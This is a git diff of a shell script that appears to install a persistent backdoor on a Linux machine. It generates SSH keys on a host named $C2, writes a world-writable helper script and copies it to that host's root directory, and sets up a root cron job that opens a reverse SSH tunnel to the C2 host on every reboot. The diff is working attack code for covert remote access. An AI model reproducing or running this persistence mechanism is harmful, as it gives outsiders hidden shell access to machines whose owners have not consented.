@@ -50,9 +50,13 @@ fi
 #Generating a remote ssh key
    ssh $C2 'ssh-keygen'
 
+echo "ssh-copy-id ${user}@localhost -p 43022 && ssh ${user}@localhost -p 43022" > /home/$user/hmu.sh
+sudo chmod 777 /home/$user/hmu.sh 
+scp /home/$user/hmu.sh $C2:/root
+
 #Setup cron job + cleanup
     echo "### Setting up cronjob ###"
-    echo "@reboot sleep 100 && sudo -u ${user} ssh -f -N -R 43022:localhost:22 ${C2} && sudo -u ${user} printf 'ssh-copy-id ${user}@localhost -p 43022 && ssh ${user}@localhost -p 43022' > /home/${user}/hmu.sh && chmod 777 /home/${user}/hmu.sh && sudo -u ${user} scp /home/${user}/hmu.sh ${C2}:/root" >> cronsh
+    echo "@reboot sleep 100 && sudo -u ${user} ssh -f -N -R 43022:localhost:22 ${C2}" >> cronsh
     sudo crontab cronsh
     rm cronsh
     printf "\n"
